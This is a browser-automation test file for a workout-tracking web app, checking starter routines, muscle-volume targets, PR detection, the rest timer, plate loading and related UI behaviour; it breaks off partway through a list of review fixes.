// r29, second round (V, 2026-10-03): the routine a new install starts with
// (decision 114), a new person's muscle map with nothing green before a set,
// targets that do not read as always behind (the radar against each region's
// minimum, the week in progress as under way, one decimal as shown, Muscles
// lines that lead with what the flag is judged on, no Planned chip on Stats,
// lagging only with a stall), demo data that follows the routine and reads
// on target, weight PRs, the rest timer's colour, missing loads at Finish,
// small plates and a lift's own bar, the Content Security Policy in the
// installed build, and one Rest day label on a rest day.
const { open } = require('./h');
const { execFileSync } = require('child_process');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');
const fails = []; const ok = (c, m, x) => { if (!c) { fails.push(m); console.log('FAIL', m, x !== undefined ? JSON.stringify(x) : ''); } else console.log('ok  ', m); };
const wait = ms => new Promise(r => setTimeout(r, ms));
const LB = 0.45359237;
const sess = (id, date, exId, sets) => ({ id, date, dayIdx: 0, dayId: null, dayName: 'Session', routineId: '', free: true, notes: '', ex: [{ exId, sets: sets.map(([w, r, rir]) => ({ w, r, rir, warm: false })) }] });

(async () => {
  // ---- Decision 114: a new install starts on Upper / lower, 4 days.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const st = await ev(() => { const L = window.__ironlog; const R = L.state.routines.find(r => r.id === L.state.activeRoutineId); return { n: L.state.routines.length, name: R.name, days: R.days.map(d => d.rest ? 'Rest' : d.name), sig: L.starterSigs().length }; });
    ok(st.n === 1 && st.name === 'Upper / lower, 4 days' && st.days.join(',') === 'Upper A,Lower A,Rest,Upper B,Lower B,Rest,Rest', 'a new install starts on Upper / lower, 4 days', st);
    // Log a workout now keeps it, with targets fitted to it.
    await ev(() => window.__ironlog.ACT.obFree());
    await wait(200);
    const lf = await ev(() => { const L = window.__ironlog; const R = L.state.routines.find(r => r.id === L.state.activeRoutineId); const plan = L.plannedSets(R); const b = L.state.settings.bands; return { name: R.name, draft: !!L.state.draft, short: Object.keys(b).filter(m => !L.TRACK_ONLY.has(m) && Math.floor(plan[m] || 0) < b[m][0]) }; });
    ok(lf.name === 'Upper / lower, 4 days' && lf.draft && !lf.short.length, 'Log a workout now keeps the starter, and its targets fit it as a pick would', lf);
    ok(!P.errors.length, 'no page errors (starter)', P.errors);
    await P.browser.close();
  }
  {
    // Picking another routine on the first pages replaces the untouched starter,
    // and an install from before r29 still on the six-day starter is replaced too.
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    await ev(() => { const L = window.__ironlog; L.ACT.obSample(); });
    await page.click('[data-act="tplPick"][data-k="full3"]'); await wait(200);
    const a = await ev(() => window.__ironlog.state.routines.map(r => r.name));
    ok(a.length === 1 && a[0] === 'Full body, 3 days', 'picking Full body replaces the untouched starter', a);
    await ev(() => { const L = window.__ironlog; const old = L.routineFromTemplate('legacy'); L.state.routines = [old]; L.state.activeRoutineId = old.id; L.state.settings.onboarded = false; L.render(); L.ACT.obSample(); });
    await page.click('[data-act="tplPick"][data-k="ppl6"]'); await wait(200);
    const b = await ev(() => window.__ironlog.state.routines.map(r => r.name));
    ok(b.length === 1 && b[0] === 'Push / pull / legs, 6 days', 'the pre-r29 six-day starter, untouched, is replaced as well', b);
    ok(!P.errors.length, 'no page errors (pick)', P.errors);
    await P.browser.close();
  }

  // ---- A new person who picked a routine: nothing green on the muscle map before a set.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    for (const k of ['ul4', 'full3', 'db3']) {
      const r = await ev(async (k) => {
        const L = window.__ironlog; L.state.settings.onboarded = false; L.state.sessions = []; L.state.settings.bands = JSON.parse(JSON.stringify(L.BANDS)); L.ui.tab = 'today'; L.render(); L.ACT.obSample();
        await new Promise(r => setTimeout(r, 50)); document.querySelector(`[data-act="tplPick"][data-k="${k}"]`).click(); await new Promise(r => setTimeout(r, 50));
        L.ui.folds['today:map'] = true; L.render();
        const card = document.querySelector('#view > [data-mkey="map"]');
        const cls = [...card.querySelectorAll('.mm')].map(g => [...g.classList].find(c => c.startsWith('st-')));
        const zeroMin = Object.entries(L.state.settings.bands).filter(([m, b]) => b[0] === 0 && !L.TRACK_ONLY.has(m)).map(([m]) => m);
        return { green: cls.filter(c => c === 'st-in' || c === 'st-over').length, amber: cls.filter(c => c === 'st-under').length, legend: card.querySelector('.bm-legend').innerText.replace(/\s+/g, ' '), sub: card.querySelector('.sec-s') ? card.querySelector('.sec-s').innerText : '', zeroMin };
      }, k);
      ok(r.green === 0 && r.amber === 0 && /Not yet \d+/.test(r.legend) && /On target 0/.test(r.legend), `${k}: before any set the map has no green and no amber, everything Not yet${r.zeroMin.length ? ' (with ' + r.zeroMin.length + ' minimums at 0)' : ''}`, r);
    }
    // muscleStatus: a minimum of 0 with no sets is none, not on target, and never low.
    const ms = await ev(() => { const L = window.__ironlog; const b = L.state.settings.bands; const k = Object.keys(b).find(m => !L.TRACK_ONLY.has(m)); const keep = b[k]; b[k] = [0, 10]; const a = L.muscleStatus({})[k]; const c = L.muscleStatus({ [k]: 1 })[k]; b[k] = keep; return { a: a.st, c: c.st }; });
    ok(ms.a === 'none' && ms.c === 'in', 'a minimum of 0: no sets reads none (grey), one set reads on target', ms);
    ok(!P.errors.length, 'no page errors (map)', P.errors);
    await P.browser.close();
  }

  // ---- Targets that do not read as always behind.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const pr = await ev(() => { const L = window.__ironlog; return { a: L.belowMin(9.96, 10), b: L.belowMin(9.94, 10), c: L.belowMin(0, 0), d: L.aboveMax(20.04, 20), e: L.aboveMax(20.06, 20) }; });
    ok(!pr.a && pr.b && !pr.c && !pr.d && pr.e, 'below and above are judged at the one decimal shown: 9.96 is not under 10, 20.04 not over 20', pr);
    // The week in progress: short of the minimum is under way, not below.
    const wk = await ev(() => { const L = window.__ironlog; const s = L.muscleStatus({ chest: 4 }, true), a = L.muscleStatus({ chest: 4 }); return { wk: s.chest.st, avg: a.chest.st }; });
    ok(wk.wk === 'part' && wk.avg === 'under', 'the same 4 sets of chest: under way during the week, below target on an average', wk);
    // The radar against each region's minimum.
    const rb = await ev(() => { const L = window.__ironlog; const b = L.state.settings.bands; const reg = L.regionBalance({ chest: b.chest[0] }); const c = reg.find(x => x.label === 'Chest'); return { pct: Math.round(c.pct), low: c.low, high: c.high }; });
    ok(rb.pct === 100 && !rb.low && !rb.high, 'a region at exactly its minimum is 100% of it, on target', rb);
    // A logged week: the radar headline counts regions on target; Muscles leads with the average.
    await ev(() => {
      const L = window.__ironlog; L.state.settings.onboarded = true;
      // Four full weeks of the same session: chest at 8 hard sets a week (under 10), back at 12.
      const out = [];
      for (let k = 1; k <= 4; k++) { const d = new Date(2026, 9, 3 - 7 * k - 4); const ds = d.toISOString().slice(0, 10);
        out.push({ id: 'w' + k, date: ds, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: Array.from({ length: 8 }, () => ({ w: 80, r: 8, rir: 2, warm: false })) }, { exId: 'latPulldown', sets: Array.from({ length: 12 }, () => ({ w: 60, r: 10, rir: 2, warm: false })) }] }); }
      L.state.sessions = out; L.invalidate(); L.ui.tab = 'dash'; L.ui.folds['dash:volume'] = true; L.ui.folds['dash:weak'] = true; L.ui.volMode = 'region'; L.render();
    });
    await wait(400);
    const v = await ev(() => { const vol = document.querySelector('#view > [data-mkey="volume"]'); const w = document.querySelector('#view > [data-mkey="weak"]'); const ch = window.Chart.getChart(document.getElementById('chRadar'));
      const chest = [...w.querySelectorAll('.card > div')].find(d => /^Chest/.test(d.innerText));
      return { head: vol.querySelector('.headline').innerText, chips: [...vol.querySelectorAll('[data-act="volMode"]')].map(b => b.dataset.v), ring: ch.data.datasets[1].label, chestRow: chest ? chest.innerText.replace(/\s+/g, ' ') : null, tags: [...w.querySelectorAll('.tag')].map(t => t.innerText) }; });
    ok(/\d of 8 regions on target\. Furthest short: /.test(v.head), 'the radar headline counts regions on target and names the furthest short in sets', v.head);
    ok(v.ring === 'Minimum (100%)' && !v.chips.includes('planned'), 'the ring is the minimum, and Stats has no Planned chip (the plan is on Plan)', v);
    ok(v.chestRow && /Below target/.test(v.chestRow) && /Chest (Lagging strength )?Below target 8 hard sets a week on average, target 10-20, this week 0 so far/.test(v.chestRow), 'Muscles leads with the average the flag is judged on, then this week', v.chestRow);
    ok(!v.tags.some(t => /logged and planned|Below target, logged/.test(t)), 'one Below target tag, without logged or planned', v.tags);
    // An old ui.volMode of planned cannot come back through the chip action.
    const vm = await ev(() => { const L = window.__ironlog; L.ACT.volMode({ dataset: { v: 'planned' } }); return L.ui.volMode; });
    ok(vm === 'region', 'Planned is not a Volume mode any more', vm);
    // This week while it is going: the rows are under way.
    const tw = await ev(() => { const L = window.__ironlog; L.state.sessions.push({ id: 'now', date: '2026-09-28', dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: [{ w: 80, r: 8, rir: 2, warm: false }, { w: 80, r: 8, rir: 2, warm: false }] }] }); L.invalidate(); L.ui.volMode = 'week'; L.render();
      const vol = document.querySelector('#view > [data-mkey="volume"]'); return { part: vol.querySelectorAll('.fill.part').length, under: vol.querySelectorAll('.fill.under').length }; });
    ok(tw.part > 0 && tw.under === 0, 'This week while it is going shows short of the minimum as under way, not amber', tw);
    ok(!P.errors.length, 'no page errors (targets)', P.errors);
    await P.browser.close();
  }

  // ---- Lagging strength: only falling, or flat with a stall.
  {
    const P = await open('index.html', { clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const r = await ev(() => {
      const L = window.__ironlog; const S = (id, d, ex, w, r) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: ex, sets: [{ w, r, rir: 1, warm: false }, { w, r, rir: 1, warm: false }] }] });
      const days = [-41, -35, -28, -21, -14, -7, -1].map(k => { const d = new Date(2026, 9, 3 + k); return d.toISOString().slice(0, 10); });
      // Chest and lats rising, quads and biceps flat with a stall, calves flat
      // on high reps with no estimate (no stall can be read).
      L.state.sessions = days.flatMap((d, i) => [S('c' + i, d, 'bench', 80 + i * 2.5, 8), S('l' + i, d, 'latPulldown', 60 + i * 2.5, 10), S('q' + i, d, 'hackSquat', 100, 8), S('b' + i, d, 'preacher', 30, 10), S('k' + i, d, 'standCalf', 100, 16)]);
      L.invalidate(); const I = L.IDX();
      return { scores: Object.fromEntries(I.scores.map(s => [s.m, s.label])), stalled: L.stalledIds() };
    });
    ok(r.stalled.includes('hackSquat') && r.scores.quads === 'lagging', 'flat with a stalled lift: lagging', r);
    ok(r.scores.chest !== 'lagging' && r.scores.lats !== 'lagging', 'rising is never lagging, whatever its rank', r.scores);
    // r30: a trend is read up to 20 reps, so calves at 100 x 16 unchanged for six weeks is a stall, and lagging.
    ok(r.stalled.includes('standCalf') && r.scores.calves === 'lagging', 'high-rep work unchanged for six weeks now reads as stalled (trend up to 20 reps)', r);
    await P.browser.close();
  }

  // ---- Demo data: a lifter who follows the routine.
  {
    for (const k of ['ul4', 'full3', 'full2', 'ppl6', 'split5', 'str5', 'db3', 'onemuscle']) {
      const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
      const { page } = P; const ev = (f, a) => page.evaluate(f, a);
      await ev((k) => { const L = window.__ironlog; const r = L.routineFromTemplate(k); L.state.routines = [r]; L.state.activeRoutineId = r.id; L.ACT.demoLoad(); }, k);
      await page.click('[data-act="mOk"]'); await wait(200);
      const d = await ev(() => { const L = window.__ironlog; const I = L.IDX(); const reg = L.regionBalance(L.actualAvg4());
        const mus = L.muscleStatus(L.actualAvg4()); const t = new Date(2026, 9, 3).toISOString().slice(0, 10);
        return { n: L.state.sessions.length, today: L.state.sessions.some(s => s.date === '2026-10-03'), stalled: L.stalledIds(), lag: I.scores.filter(s => s.label === 'lagging').map(s => s.m), low: reg.filter(x => x.low).map(x => x.label), under: Object.entries(mus).filter(([m, x]) => x.st === 'under').map(([m]) => m), coach: L.coach().text, prs: I.prs.length, moving: Object.values(I.exStats).filter(s => s.moving).length, falling: Object.values(I.exStats).filter(s => s.falling).length }; });
      ok(d.n > (k === 'full2' ? 12 : 20) && !d.today && !d.stalled.length && !d.lag.length && !d.low.length && !d.under.length && /^On track/.test(d.coach) && d.prs > 20 && d.moving >= 3 && !d.falling, `${k}: the demo has every session done, today open, lifts moving, nothing stalled, lagging, or below target, and the coach says on track`, d);
      // Clearing it on a first run puts the default targets back.
      const back = await ev(() => { const L = window.__ironlog; L.ACT.demoClear(); return JSON.stringify(L.state.settings.bands) === JSON.stringify(L.BANDS); });
      ok(back, `${k}: clearing the demo on a first run puts the default targets back`);
      ok(!P.errors.length, `no page errors (demo ${k})`, P.errors);
      await P.browser.close();
    }
  }

  // ---- Weight PRs.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const r = await ev(() => {
      const L = window.__ironlog; const S = (id, d, w, r, rir) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: [{ w, r, rir, warm: false }] }] });
      L.state.sessions = [S('a', '2026-09-20', 100, 8, 2), S('b', '2026-09-27', 100, 6, 2)]; L.invalidate();
      const live = (w, r, rir) => L.livePR('bench', { w, r, rir, done: true, warm: false }, '2026-10-03');
      return { heavier: live(102.5, 8, 2), heavierFewer: live(102.5, 3, 2), moreReps: live(100, 9, 2), same: live(100, 8, 2), lighterMore: live(90, 12, 2) };
    });
    // r32: a heavier set is announced only when it is stronger than ever; 102.5 x 3 after 100 x 8 is not.
    ok(r.heavier === 'Weight PR' && r.heavierFewer === null, 'a set heavier than any before is a weight PR when it is also the strongest; heavier with far fewer reps is not announced', r);
    ok(r.moreReps !== 'Weight PR' && r.moreReps && r.same === null, 'the same weight with more reps is not a weight PR; the same set again is no PR', r);
    // The PR list: a heavier set that also beat the estimate is one weight PR that notes it.
    const f = await ev(() => { const L = window.__ironlog; L.state.sessions.push({ id: 'c', date: '2026-10-01', dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: [{ w: 105, r: 8, rir: 2, warm: false }] }] }); L.invalidate();
      const p = L.IDX().prs.filter(x => x.exId === 'bench' && x.date === '2026-10-01'); L.ui.tab = 'dash'; L.ui.folds['dash:exercise'] = true; L.ui.folds['dash:sub:prs'] = true; L.render();
      const list = [...document.querySelectorAll('#sub-prs .tag')].map(t => t.innerText).filter(t => /PR|estimate/.test(t)); return { p, list }; });
    ok(f.p.length === 1 && f.p[0].type === 'Weight PR' && f.p[0].value != null && f.p[0].prevW === 100, 'one PR for the session: Weight PR, with the new best estimate and the old heaviest kept', f.p);
    ok(f.list.includes('Weight PR') && !f.list.includes('e1RM'), 'the PR list says Weight PR and Best estimate, never e1RM', f.list);
    // Live in a session: the toast names the weight PR and the estimate it set.
    await ev(() => { const L = window.__ironlog; L.state.sessions = L.state.sessions.filter(s => s.id !== 'c'); L.invalidate(); L.state.settings.onboarded = true; L.ACT.startFree(); L.ACT.mClose();
      const d = L.state.draft; d.ex = [L.newBlock ? L.newBlock('bench', { sets: 1, repMin: 6, repMax: 10, rir: 2, rest: 0 }) : null].filter(Boolean); L.render(); });
    const hasBlock = await ev(() => { const d = window.__ironlog.state.draft; return !!(d && d.ex.length); });
    if (hasBlock) {
      await ev(() => { const L = window.__ironlog; const b = L.state.draft.ex[0]; b.sets[0].w = 105; b.sets[0].r = 8; b.sets[0].rir = 2; L.render(); });
      await page.click('[data-act="sDone"][data-b="0"][data-s="0"]'); await wait(150);
      const t = await ev(() => document.getElementById('toast').innerText);
      ok(/^Weight PR: Barbell Bench Press, .*heaviest before .*best estimate for sets of \d+ to \d+ reps now/.test(t), 'the toast says Weight PR, what it beat, and the new best estimate with its rep band (r30)', t);
    } else ok(false, 'could not build a session block for the toast check');
    ok(!P.errors.length, 'no page errors (PRs)', P.errors);
    await P.browser.close();
  }

  // ---- The rest timer stands out, with white text at 4.5:1 on every accent, and a bar that empties.
  {
    const lum = c => { const v = c.map(x => x <= 0.03928 ? x / 12.92 : ((x + 0.055) / 1.055) ** 2.4); return 0.2126 * v[0] + 0.7152 * v[1] + 0.0722 * v[2]; };
    const parse = s => { let m = s.match(/color\(srgb ([\d.]+) ([\d.]+) ([\d.]+)/); if (m) return m.slice(1, 4).map(Number); m = s.match(/rgba?\((\d+), (\d+), (\d+)/); return m ? m.slice(1, 4).map(x => x / 255) : null; };
    for (const [acc, dark] of [['blue', true], ['volt', true], ['ember', true], ['blue', false]]) {
      const P = await open('index.html', { touch: true, dark, clock: '2026-10-03T11:30:00' });
      const { page } = P; const ev = (f, a) => page.evaluate(f, a);
      await ev(([acc, dark]) => { const L = window.__ironlog; L.state.settings.onboarded = true; L.state.settings.accent = acc; L.state.settings.theme = dark ? 'dark' : 'light'; L.render(); L.timer && 0; }, [acc, dark]);
      await ev(() => { document.documentElement.dataset.accent = window.__ironlog.state.settings.accent; });
      const r = await ev(async () => { const L = window.__ironlog; L.ACT.startFree(); await new Promise(r => setTimeout(r, 50));
        const t = document.getElementById('timer'); t.hidden = false; return null; });
      // Start a 90 s rest through the real path.
      await ev(() => { const L = window.__ironlog; L.timer.end = 0; });
      await ev(() => { const el = document.getElementById('timer'); el.hidden = true; });
      await ev(() => window.__ironlog.ACT.tAdd());
      await wait(300);
      const c = await ev(() => { const t = document.getElementById('timer'); const cs = getComputedStyle(t); const stops = [...cs.backgroundImage.matchAll(/color\(srgb [\d. ]+\)|rgba?\([^)]+\)/g)].map(m => m[0]); return { stops, bg: getComputedStyle(document.body).backgroundColor, color: cs.color, tp: t.style.getPropertyValue('--tp'), done: t.classList.contains('done') }; });
      const fg = parse(c.color); const worst = Math.min(...c.stops.map(s => { const b = parse(s); return (Math.max(lum(fg), lum(b)) + 0.05) / (Math.min(lum(fg), lum(b)) + 0.05); }));
      const page_ = parse(c.bg); const dock = parse(c.stops[0]); const dist = Math.hypot(...dock.map((x, i) => x - page_[i]));
      ok(c.stops.length >= 2 && worst >= 4.5 && dist > 0.15 && !c.done && +c.tp > 0.9, `${acc}${dark ? ' dark' : ' light'}: the running timer is a tint of the accent, apart from the page, white text at ${worst.toFixed(2)}:1, bar full at the start`, c);
      await ev(() => { window.__ironlog.timer.end = Date.now() + 5000; }); await wait(400);
      const tp2 = await ev(() => +document.getElementById('timer').style.getPropertyValue('--tp'));
      ok(tp2 < 0.5, `${acc}: the bar empties as the rest runs down`, tp2);
      await P.browser.close();
    }
  }

  // ---- Missing loads at Finish: asked to add them first.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    await ev(() => { const L = window.__ironlog; L.state.settings.onboarded = true; L.ui.tab = 'today'; L.render(); document.querySelector('.hero [data-act="startSession"]').click(); });
    await wait(200);
    await ev(() => { const L = window.__ironlog; const b = L.state.draft.ex[0]; b.sets[0].w = null; b.sw = null; b.sets[0].r = 8; L.render(); });
    await page.click('[data-act="sDone"][data-b="0"][data-s="0"]'); await wait(100);
    await ev(() => window.__ironlog.ACT.finishNow()); await wait(100);
    const m = await ev(() => { const x = window.__ironlog.ui.modal; return x && { title: x.title, ok: x.okLabel, alt: x.alt && x.alt.label, body: x.body }; });
    ok(m && m.title === 'Add the missing loads?' && m.ok === 'Add loads' && m.alt === 'Save anyway' && /reps but no weight/.test(m.body), 'Finish with a set ticked and no weight asks to add it first', m);
    await page.click('[data-act="mOk"]'); await wait(200);
    const f = await ev(() => { const a = document.activeElement; return { saved: window.__ironlog.state.sessions.length, focus: a && a.dataset ? a.dataset.f + a.dataset.b + a.dataset.s : null, need: a && a.classList.contains('need') }; });
    ok(f.saved === 0 && f.focus === 'w00' && f.need, 'Add loads saves nothing and puts the cursor in that load, outlined', f);
    await ev(() => window.__ironlog.ACT.finishNow()); await wait(100);
    await page.click('[data-act="mAlt"]'); await wait(300);
    const s = await ev(() => window.__ironlog.state.sessions.length);
    ok(s === 1, 'Save anyway saves the session', s);
    ok(!P.errors.length, 'no page errors (missing loads)', P.errors);
    await P.browser.close();
  }

  // ---- Small plates and a lift's own bar.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const r = await ev(() => {
      const L = window.__ironlog; const LB = 0.45359237;
      const off = L.plateText(137.5 * LB, 'bar');
      L.state.settings.smallPlates = true; const on = L.plateText(137.5 * LB, 'bar');
      const n1 = L.normalize(JSON.parse(JSON.stringify(L.state))).settings.smallPlates;
      delete L.state.settings.smallPlates; const n2 = 'smallPlates' in L.normalize(JSON.parse(JSON.stringify(L.state))).settings;
      // A trap bar of 55 lb on a deadlift.
      const ex = L.state.exercises.find(e => e.id === 'rackPull') || L.state.exercises.find(e => e.equip === 'barbell');
      ex.barKg = 55 * LB; const trap = L.plateText(145 * LB, 'bar', ex); const def = L.plateText(145 * LB, 'bar');
      const kept = L.normalize(JSON.parse(JSON.stringify(L.state))).exercises.find(e => e.id === ex.id).barKg;
      const other = L.normalize(JSON.parse(JSON.stringify(L.state))).exercises.find(e => e.id === 'bench');
      return { off, on, n1, n2, trap, def, kept: Math.round(kept / LB), noBar: !('barKg' in other) || other.barKg === undefined };
    });
    ok(/not loadable/.test(r.off) && /1\.25/.test(r.on) && !/not loadable/.test(r.on), 'small plates add 1.25 lb, so 137.5 lb is loadable', r);
    ok(r.n1 === true && r.n2 === false, 'small plates are saved only when on', r);
    ok(/^Per side at 145: 45$/.test(r.trap) && /^Per side at 145: 45, 5$/.test(r.def), 'a 55 lb trap bar changes the plates per side (45 a side, against 45 and 5 on the 45 lb bar)', r);
    ok(r.kept === 55 && r.noBar, 'a lift keeps its own bar; others have none set', r);
    // The deload floor is the lift's own bar.
    const fl = await ev(() => { const L = window.__ironlog; const LB = 0.45359237; const ex = L.state.exercises.find(e => e.id === 'ezCurl'); ex.barKg = 25 * LB; const w = L.lighterLoad(ex, { inc: 5 * LB }, 30 * LB, 10 * LB); return Math.round(w / LB); });
    ok(fl === 25, 'a curl on a 25 lb EZ bar never deloads under the bar', fl);
    // Settings and the editor show them.
    await ev(() => { const L = window.__ironlog; L.state.settings.onboarded = true; L.ui.tab = 'settings'; L.render(); document.querySelectorAll('#view details').forEach(d => d.open = true); });
    const ui = await ev(() => !!document.querySelector('[data-bind="smallPlates"]'));
    ok(ui, 'Settings has Small plates');
    await ev(() => { const L = window.__ironlog; L.ACT.exEdit({ dataset: { ex: 'bench' } }); document.querySelectorAll('#modal details').forEach(d => d.open = true); });
    const ed = await ev(() => !!document.querySelector('[data-ebind="barRaw"]'));
    ok(ed, 'the exercise editor has Bar for this lift on a barbell lift');
    ok(!P.errors.length, 'no page errors (plates)', P.errors);
    await P.browser.close();
  }

  // ---- One Rest day label on a rest day in Plan.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00', realStarter: true });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    const n = await ev(() => { const L = window.__ironlog; L.state.settings.onboarded = true; L.ui.tab = 'program'; L.ui.folds['program:days'] = true; L.render(); return [...document.querySelectorAll('.dmeta')].map(d => d.innerText.replace(/\s+/g, ' ').trim()); });
    ok(n.some(x => x === 'Rest day') && !n.some(x => /Rest day Rest day/.test(x)), 'a rest day says Rest day once, on its checkbox', n);
    await P.browser.close();
  }

  // ---- The independent review's fixes, each checked.
  {
    const P = await open('index.html', { touch: true, clock: '2026-10-03T11:30:00' });
    const { page } = P; const ev = (f, a) => page.evaluate(f, a);
    // 1. The rest bar keeps its length across a reload.
    await ev(() => { const L = window.__ironlog; L.state.settings.onboarded = true; L.ui.tab = 'today'; L.render(); document.querySelector('.hero [data-act="startSession"]').click(); });
    await wait(200);
    await ev(() => { const L = window.__ironlog; L.timer.end = 0; L.ACT.tAdd(); L.ACT.tAdd(); L.ACT.tAdd(); L.ACT.tAdd(); });
    await wait(200);
    await ev(() => { const t = window.__ironlog.timer; t.end = Date.now() + 15000; t.total = 60; window.__ironlog.saveNow(); localStorage.setItem(window.__ironlog.KEY + '.timer', String(t.end)); localStorage.setItem(window.__ironlog.KEY + '.timerLen', '60'); });
    await page.reload(); await page.waitForFunction(() => window.__ironlog && window.__libs && window.__libs.chart);
    await wait(500);
    const tp = await ev(() => { const t = document.getElementById('timer'); return { hidden: t.hidden, tp: +t.style.getPropertyValue('--tp') }; });
    ok(!tp.hidden && tp.tp > 0.15 && tp.tp < 0.35, '1. after a reload with 15 s of a 60 s rest left, the bar shows about a quarter, not full', tp);
    // 12. An assisted set with less help than ever is a weight PR live, with no bodyweight logged.
    const ap = await ev(() => { const L = window.__ironlog; L.state.bodyweights = []; L.state.draft = null;
      const S = (id, d, w) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'assistPullup', sets: [{ w, r: 8, rir: 2, warm: false }] }] });
      L.state.sessions = [S('a', '2026-09-20', -40 * 0.45359237), S('b', '2026-09-27', -40 * 0.45359237)]; L.invalidate();
      const live = L.livePR('assistPullup', { w: -35 * 0.45359237, r: 8, rir: 2, done: true }, '2026-10-03');
      L.state.sessions.push(S('c', '2026-10-01', -35 * 0.45359237)); L.invalidate();
      const saved = L.IDX().prs.filter(p => p.exId === 'assistPullup' && p.date === '2026-10-01').map(p => p.type);
      return { live, saved }; });
    ok(ap.live === 'Weight PR' && ap.saved.join() === 'Weight PR', '12. less help on an assisted lift is a weight PR live and saved, with no bodyweight logged', ap);
    // 6. A weighted pull-up's first added load reads in bodyweight terms, never "0 lb".
    const bw = await ev(() => { const L = window.__ironlog; L.state.bodyweights = [{ id: 'bw', date: '2026-09-01', kg: 80 }];
      const S = (id, d, w) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'pullup', sets: [{ w, r: 8, rir: 2, warm: false }] }] });
      L.state.sessions = [S('a', '2026-09-20', 0), S('b', '2026-09-27', 0)]; L.invalidate();
      L.state.settings.onboarded = true; L.ACT.startFree(); L.ACT.mClose(); const d = L.state.draft; d.ex = [L.newBlock('pullup', { sets: 1, repMin: 6, repMax: 10, rir: 2, rest: 0 })]; d.ex[0].sets[0].w = 5 * 0.45359237; d.ex[0].sets[0].r = 8; d.ex[0].sets[0].rir = 2; L.render(); return true; });
    await page.click('[data-act="sDone"][data-b="0"][data-s="0"]'); await wait(150);
    const bt = await ev(() => document.getElementById('toast').innerText);
    ok(/^Weight PR: Pull-up/.test(bt) && /heaviest before BW\b/.test(bt) && !/before 0/.test(bt), '6. a weighted pull-up past bodyweight says heaviest before BW, never 0 lb', bt);
    // 5. The chart tooltip names a weight PR that did not raise the estimate.
    const tt = await ev(() => { const L = window.__ironlog; L.state.draft = null;
      const S = (id, d, w, r) => ({ id, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'bench', sets: [{ w, r, rir: 0, warm: false }] }] });
      // 100x10 sets the estimate; 102.5x3 is heavier but a lower estimate in its own band... (band 1-5 has no earlier set, so it is a best there). Use 101x5 after 100x6 in the same band.
      L.state.sessions = [S('a', '2026-09-13', 100, 6), S('b', '2026-09-20', 100, 6), S('c', '2026-09-27', 100.5, 4)]; L.invalidate();
      const p = L.IDX().prs.find(x => x.date === '2026-09-27');
      L.ui.tab = 'dash'; L.ui.dashEx = 'bench'; L.ui.folds['dash:exercise'] = true; L.render();
      const ch = window.Chart.getChart(document.getElementById('chEx')); const i = ch.data.datasets[0].data.length - 1;
      const lab = ch.options.plugins.tooltip.callbacks.afterLabel({ datasetIndex: 0, dataIndex: i });
      return { type: p && p.type, value: p && p.value, lab }; });
    ok(tt.type === 'Weight PR' && tt.value == null && tt.lab === 'Weight PR: more weight than ever before', '5. a weight PR that did not raise the estimate is named so on the chart', tt);
    // 9. The radar draws at most 200%; the tooltip and the table keep the real share.
    const rc = await ev(() => { const L = window.__ironlog; const b = L.state.settings.bands; b.abs = [1, 26]; b.obliques = [1, 10];
      const out = []; for (let k = 1; k <= 4; k++) { const d = new Date(2026, 9, 3 - 7 * k - 4).toISOString().slice(0, 10); out.push({ id: 'r' + k, date: d, dayIdx: 0, dayId: null, dayName: 'A', routineId: '', free: true, notes: '', ex: [{ exId: 'cableCrunch', sets: Array.from({ length: 10 }, () => ({ w: 50, r: 12, rir: 2, warm: false })) }] }); }
      L.state.sessions = out; L.invalidate(); L.ui.tab = 'dash'; L.ui.volMode = 'region'; L.ui.folds['dash:volume'] = true; L.render();
      const ch = window.Chart.getChart(document.getElementById('chRadar')); const i = ch.data.labels.indexOf('Core'); const ds = ch.data.datasets[0];
      const tip = ch.options.plugins.tooltip.callbacks.label({ dataset: ds, dataIndex: i, formattedValue: String(ds.data[i]) });
      const row = [...document.querySelectorAll('#view [data-mkey="volume"] tr')].find(r => /Core/.test(r.innerText)).innerText;
      return { plotted: ds.data[i], max: ch.options.scales.r.max, tip, row: row.replace(/\s+/g, ' ') }; });
    ok(rc.plotted === 200 && rc.max === 200 && /: 500%$/.test(rc.tip) && /500%/.test(rc.row), '9. a region far past a small minimum is drawn at 200% while the tooltip and table say 500%', rc);
    // 13. On an average, a muscle with a minimum and no sets is amber on the map and counted below in the legend and the summary alike.
